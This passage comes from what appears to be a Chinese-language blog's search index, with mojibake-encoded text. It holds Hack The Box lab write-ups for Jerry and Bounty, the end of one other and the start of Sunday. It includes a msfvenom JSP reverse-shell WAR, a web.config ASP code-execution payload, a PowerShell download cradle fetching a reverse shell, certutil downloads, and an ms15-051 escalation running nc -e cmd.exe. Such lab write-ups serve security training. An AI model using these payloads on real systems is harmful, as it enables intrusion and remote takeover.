v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.10.100.....\n[*] Found writable share ADMIN$\n[*] Uploading file CahMAAGa.exe\n[*] Opening SVCManager on 10.10.10.100.....\n[*] Creating service jzgq on 10.10.10.100.....\n[*] Starting service jzgq.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ shell\n\n```bash\nc:\\Users\\Administrator\\Desktop> type root.txt\nd7a6880e1ed8648dcb9012f911819322\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Jerry - Hackthebox","url":"/2022/04/23/Hackthebox/Easy/Hackthebox-Jerry/","content":"\n# Hackthebox - Jerry\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Jerry/2aa66885-a270-42fe-81ab-1425ffc6498f.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Jerry/5f0e0886-3443-4e59-8bf0-369576652f23.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.95          \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:03 EDT\nNmap scan report for 10.10.10.95\nHost is up (0.33s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2008|Vista|7 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7\nAggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   333.58 ms 10.10.14.1\n2   334.33 ms 10.10.10.95\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 61.70 seconds\n```\n## Http\nè¿™é‡Œåªæœ‰ä¸€ä¸ª 8080 ç«¯å£ï¼Œå»è®¿é—®ä¸€ä¸‹çœ‹çœ‹\n\n![](Hackthebox-Jerry/6e5141f4-3c25-4560-917f-a9ad84a2b6be.png)\n\næ˜¯ä¸€ä¸ª tomcat çš„é¡µé¢ï¼Œå°è¯•ä¸€ä¸‹å¼±å£ä»¤ç™»å½•\n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Jerry/ba3b45d7-9918-411e-bdd0-9d07e0d23436.png)\n\nä½¿ç”¨å¼±å£ä»¤ admin/admin æˆåŠŸç™»å½•ï¼Œä½†æ˜¯è¿™é‡Œå´æ²¡æœ‰çœ‹åˆ°ä¸Šä¼ ç‚¹ï¼Œæˆ‘æ€€ç–‘ä¸å¤ªå¯¹ï¼Œå› ä¸ºtomcat çš„ ç™»å½•å¯†ç ä¸€èˆ¬æ˜¯ tomcat\n\n![](Hackthebox-Jerry/6923f155-801f-42f9-bb64-22048fc65505.png)\n\nåœ¨è¾“å…¥å¯†ç çš„æ—¶å€™é€‰æ‹©å–æ¶ˆï¼Œç„¶ååœ¨é”™è¯¯é¡µé¢ä¸­å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = tomcat\npassword = s3cret\n```\n![](Hackthebox-Jerry/a7ec9f00-77ad-43c0-b5d6-f7c054dcc97e.png)\n\nè¿™æ¬¡æƒé™å°±å¯¹äº†ï¼Œç„¶åä½¿ç”¨ msfvenom å»ç”Ÿæˆä¸€ä¸ª war é©¬\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war\n```\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n![](Hackthebox-Jerry/75fbd76d-9f12-4218-be6b-5f60529d325a.png)\n\nä¸Šä¼ åå»è®¿é—®ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.95] 49193\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\apache-tomcat-7.0.88>whoami\nwhoami\nnt authority\\system\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell\n\n```bash\nc:\\Users\\Administrator\\Desktop\\flags>type \"2 for the price of 1.txt\"\ntype \"2 for the price of 1.txt\"\nuser.txt\n7004dbcef0f854e0fb401875f26ebd00\n\nroot.txt\n04a8b36e1545a455393d067e772fe90e\n```\næ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶ï¼Œå€’æ˜¯ä¸ç”¨ææƒäº†","tags":["Hackthebox"]},{"title":"Bounty - Hackthebox","url":"/2022/04/22/Hackthebox/Easy/Hackthebox-Bounty/","content":"\n# Hackthebox - Bounty\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Bounty/a0ae619a-9c2b-42ed-90e6-4145a10d9e36.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Bounty/c568cfcf-ae66-4c3a-b7cf-08f38c9feeab.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.93\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-20 16:39 CST\nNmap scan report for 10.10.10.93\nHost is up (0.38s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Bounty\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   342.38 ms 10.10.16.1\n2   513.76 ms 10.10.10.93\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 57.51 seconds\n```\n## Http\n![](Hackthebox-Bounty/ecef5259-e729-4bd4-9c09-34791d0dd6f0.png)\n\nhttp é‡Œä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz ä¸€ä¸‹çœ‹çœ‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~]\nâ””â”€# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.93/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/20 16:44:18 Starting gobuster in directory enumeration mode\n===============================================================\n/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]\n\n===============================================================\n2022/04/20 16:47:53 Finished\n===============================================================\n```\næœ‰ä¸€ä¸ªç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Bounty/d1eb8957-4107-4be7-aa48-9b21dcb3d71d.png)\n\n403 äº†ï¼Œé€šè¿‡ nmap å¾—çŸ¥è¿™æ˜¯ windows ç³»ç»Ÿä¸‹çš„ iis æ­å»ºçš„ç½‘ç«™ï¼Œè®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹ç”¨ -x æ‰«æ aspx æ ¼å¼çš„ç½‘é¡µ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~]\nâ””â”€# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 --no-error -x aspx\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.93/\n[+] Method:                  GET\n[+] Threads:                 500\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              aspx\n[+] Timeout:                 10s\n===============================================================\n2022/04/20 16:57:38 Starting gobuster in directory enumeration mode\n===============================================================\n/transfer.aspx        (Status: 200) [Size: 941]\n\n===============================================================\n2022/04/20 16:59:36 Finished\n===============================================================\n```\n![](Hackthebox-Bounty/b855bbeb-2c65-49c6-a002-ff20fd7c2542.png)\n\næˆ‘ä»¬æ‰«æåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢\n\néšä¾¿ä¸Šä¼ å¼ å›¾ç‰‡è¯•è¯•çœ‹\n\n![](Hackthebox-Bounty/0f58a9af-1dee-4df9-bbf4-42f209000f77.png)\n\nè¿™é‡Œæ˜¾ç¤ºä¸Šä¼ æˆåŠŸï¼Œå»è®¿é—®ä¸€ä¸‹çœ‹çœ‹èƒ½ä¸èƒ½è®¿é—®åˆ°\n\n![](Hackthebox-Bounty/f5bf4d16-3a3d-4a67-951f-c2a79d93233e.png)\n\nå¯ä»¥è®¿é—®åˆ°ï¼Œä½†æ˜¯å¤§æ¦‚ä¸€åˆ†é’Ÿå·¦å³å°±ä¼šè¢«è‡ªåŠ¨åˆ é™¤\n\n![](Hackthebox-Bounty/3ffe6028-8d90-4e87-8664-d979a5799b34.png)\n\nå°è¯•ä¸Šä¼ äº†ä¸€ä¸ªaspxæ–‡ä»¶ï¼Œè¿™æ¬¡ä¸Šä¼ å¤±è´¥äº†\n\nå»æœäº†ä¸€ä¸‹ç›¸å…³çš„æ¼æ´ï¼Œå€’æ˜¯æœåˆ°äº†ä¸€äº›æ¼æ´\n\n![](Hackthebox-Bounty/1b35566e-f9f1-4ad7-b16b-96c0c1bac2f8.png)\n\n> [https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)\n\nå»åˆ©ç”¨å§\n\n# æ¼æ´åˆ©ç”¨\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!\n<%\nResponse.write(\"-\"&\"->\")\n' it is running the ASP code if you can see 3 by opening the web.config file!\nResponse.write(1+2)\nResponse.write(\"<!-\"&\"-\")\n%>\n-->\n```\nå°†è¿™æ®µæ–‡ä»¶ä»£ç ä¿å­˜ä¸º web.config ç„¶åä¸Šä¼ ï¼Œå»æŸ¥çœ‹åå¦‚æœçœ‹åˆ°äº† â€œ3â€ åˆ™è¡¨ç¤º payload è¢«æ‰§è¡Œäº†\n\n![](Hackthebox-Bounty/124031ef-b2c4-4220-963f-82c6a27c1446.png)\n\nç¡®å®æ‰§è¡ŒæˆåŠŸäº†\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!-- \n<%\nSet rs = CreateObject(\"WScript.Shell\")\nSet cmd = rs.Exec(\"cmd /c whoami\")\no = cmd.StdOut.readall()\nResponse.write(o)\n%>\n-->\n```\nä¿®æ”¹ä¸€ä¸ª POCï¼Œç„¶åä¸Šä¼ \n\n![](Hackthebox-Bounty/6d4a1396-e4a5-485c-9641-8363fe689610.png)\n\nè¿™é‡ŒæˆåŠŸè¿”å›äº†æˆ‘ä»¬è¦çš„ä¸œè¥¿\n\næ¥æ˜ç¡®ä¸€ä¸‹æ”»å‡»è·¯å¾„\n\n## Step 1\nä½¿ç”¨ nishang æ¥è¿›è¡Œ getshell\n\n> [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)\n\nç„¶ååœ¨æœ€åä¸€è¡ŒåŠ å…¥ä¸‹é¢çš„ä»£ç \n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444\n```\n## Step 2\nç„¶åæ„é€ å¥½ web.config ä¸­çš„è¯­å¥\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!-- \n<%\nSet rs = CreateObject(\"WScript.Shell\")\nSet cmd = rs.Exec(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/Invoke-PowerShellTcp.ps1')\")\no = cmd.StdOut.readall()\nResponse.write(o)\n%>\n-->\n```\nç„¶åä½¿ç”¨ nc åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\næ¥ç€ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\n## Step 3\nä¸Šä¼ å¹¶è®¿é—®æˆ‘ä»¬çš„ payload\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49158\nWindows PowerShell running as user BOUNTY$ on BOUNTY\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\windows\\system32\\inetsrv>whoami\nbounty\\merlin\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell\n\n# æƒé™æå‡\nä½¿ç”¨ systeminfo æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯\n\n```bash\nPS C:\\windows\\system32\\inetsrv> systeminfo\n\nHost Name:                 BOUNTY                                                                                                                                                                                   \nOS Name:                   Microsoft Windows Server 2008 R2 Datacenter                                                                                                                                              \nOS Version:                6.1.7600 N/A Build 7600                                                                                                                                                                  \nOS Manufacturer:           Microsoft Corporation                                                                                                                                                                    \nOS Configuration:          Standalone Server                                                                                                                                                                        \nOS Build Type:             Multiprocessor Free                                                                                                                                                                      \nRegistered Owner:          Windows User                                                                                                                                                                             \nRegistered Organization:                                                                                                                                                                                            \nProduct ID:                55041-402-3606965-84760                                                                                                                                                                  \nOriginal Install Date:     5/30/2018, 12:22:24 AM                                                                                                                                                                   \nSystem Boot Time:          4/22/2022, 6:08:06 AM                                                                                                                                                                    \nSystem Manufacturer:       VMware, Inc.                                                                                                                                                                             \nSystem Model:              VMware Virtual Platform                                                                                                                                                                  \nSystem Type:               x64-based PC                                                                                                                                                                             \nProcessor(s):              1 Processor(s) Installed.                                                                                                                                                                \n                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz                                                                                                                         \nBIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                                                                                                                \nWindows Directory:         C:\\Windows                                                                                                                                                                               \nSystem Directory:          C:\\Windows\\system32                                                                                                                                                                      \nBoot Device:               \\Device\\HarddiskVolume1                                                                                                                                                                  \nSystem Locale:             en-us;English (United States)                                                                                                                                                            \nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul\nTotal Physical Memory:     2,047 MB\nAvailable Physical Memory: 28 MB\nVirtual Memory: Max Size:  4,095 MB\nVirtual Memory: Available: 1,786 MB\nVirtual Memory: In Use:    2,309 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    WORKGROUP\nLogon Server:              N/A\nHotfix(s):                 N/A\nNetwork Card(s):           1 NIC(s) Installed.\n                           [01]: Intel(R) PRO/1000 MT Network Connection\n                                 Connection Name: Local Area Connection\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 10.10.10.93\n```\næ²¡æœ‰è¡¥ä¸ï¼Œé‚£å°±ç›´æ¥ ms15-051 ææƒäº†\n\n> [https://github.com/wikiZ/ms15--051](https://github.com/wikiZ/ms15--051)\n\n> [https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4](https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4)\n\nè¿™é‡Œçš„ shell ä¸å¤ªç¨³å®šï¼Œå’±ä»¬å…ˆä½¿ç”¨ msf è·å–ä¸€ä¸ª shell å§\n\nç„¶åå’±ä»¬ä½¿ç”¨ shell æ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤\n\n```bash\ncd c:\\users\\merlin\\desktop\ncertutil -urlcache -split -f http://10.10.14.2/ms15-051.exe\ncertutil -urlcache -split -f http://10.10.14.2/nc64.exe\n./ms15-051.exe \"./nc64.exe 10.10.14.2 5555 -e cmd.exe\"\n```\nç„¶åä½¿ç”¨ msf å¼€å¯ç›‘å¬\n\n```bash\nuse exploit/multi/handler\nset lhost 10.10.14.2\nexploit\n```\nç„¶åæ‰§è¡Œæ–‡ä»¶\n\n```bash\n&\"C:\\users\\merlin\\Desktop\\shell.exe\"\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                                                       1 â¨¯\nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49181\nWindows PowerShell running as user BOUNTY$ on BOUNTY\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\nnt authority\\system\n```\næˆåŠŸå¾—åˆ° root æƒé™çš„ shell\n\n```bash\nPS C:\\Windows\\system32> type c:/users/merlin/desktop/user.txt   \n66aee8a564d37a25796466f0699d7e8a\nPS C:\\Windows\\system32> type c://users/administrator/desktop/root.txt\na376f4044a2bd073ed0abf33f3b659f4\n```\næˆåŠŸå¾—åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶\n\n# å…¶ä»–\nå¦‚æœ ms15-051 ä¸€ç›´å¡é¡¿ï¼Œé‚£å¯ä»¥è¯•è¯• juicy-potato\n\n> [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)","tags":["Hackthebox"]},{"title":"Sunday - Hackthebox","url":"/2022/04/19/Hackthebox/Easy/Hackthebox-Sunday/","content":"\n# Hackthebox - Sunday\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Sunday/50bf0a85-b184-47ac-96d1-c797e6e75126.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Sunday/77b290ae-9d48-48b2-bb74-e9f9fb44fb7e.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.76\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-14 12:51 CST\nWarning: 10.10.10.76 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.76\nHost is up (0.14s latency).\nNot shown: 59990 filtered ports, 5540 closed ports\nPORT      STATE SERVICE  VERSION\n79/tcp    open  finger?\n|_finger: No one logged on\\x0D\n| fingerprint-strings:\n|   GenericLines:\n|     No one logged on\n|   GetRequest:\n|     Login Name TTY Idle When Where\n|     HTTP/1.0 ???\n|   HTTPOptions:\n|     Login Name TTY Idle When Where\n|     HTTP/1.0 ???\n|     OPTIONS ???\n|   Help:\n|     Login Name TTY Idle When Where\n|     HELP ???\n|   RTSPRequest:\n|     Login Name TTY Idle When Where\n|     OPTIONS ???\n|     RTSP/1.0 ???\n|   SSLSessionReq, TerminalServerCookie:\n|_    Login Name TTY Idle When Where\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n515/tcp   open  printer?\n6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)\n|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14\n| http-title: Solaris Dashboard\n|_Requested resource was https://10.10.10.76:6787/solaris/\n| ssl-cert: Subject: commonName=sunday\n| Subject Alternative Name: DNS:sunday\n| Not valid before: 2021-12-08T19:40:00\n|_Not valid after:  2031-12-06T19:40:00\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  http/1.1\n22022/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port79-TCP:V=7.91%I=7%D=4/14%Time=6257A8F1%P=x86_64-pc-linux-gnu%r(Gene\nSF:ricLines,12,\"No\\x20one\\x20logged\\x20on\\r\\n\")%r(GetRequest,93,\"Login\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2\nSF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\\nSF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:?\\?\\?\\r\\n\")%r(Help,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\?\\?\\?\\r\\n\")%r(HTTPOptions,93,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\\nSF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\")%r(RTSPRequest,93,\"Login\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2\nSF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\")%r(SS\nSF:LSessionReq,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\?\\?\\?\\r\\n\")%r(TerminalServerCookie,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\nSF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 